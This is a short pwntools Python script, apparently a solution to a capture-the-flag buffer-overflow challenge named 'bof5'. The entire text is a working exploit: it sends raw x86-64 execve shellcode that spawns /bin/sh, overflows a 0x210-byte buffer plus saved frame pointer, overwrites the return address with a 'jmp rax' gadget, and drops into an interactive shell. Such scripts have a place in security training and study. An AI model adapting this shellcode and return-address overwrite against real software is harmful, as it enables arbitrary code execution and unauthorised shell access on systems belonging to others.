from pwn import *

exe = ELF('./bof5')
r = process(exe.path)

call_rax = 0x0000000000401014
jmp_rax = 0x000000000040110c
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = b'a'*(0x210 + 0x8) + p64(jmp_rax)
#input()
r.sendafter(b'> ', shellcode)
r.sendafter(b'> ', payload)
r.interactive()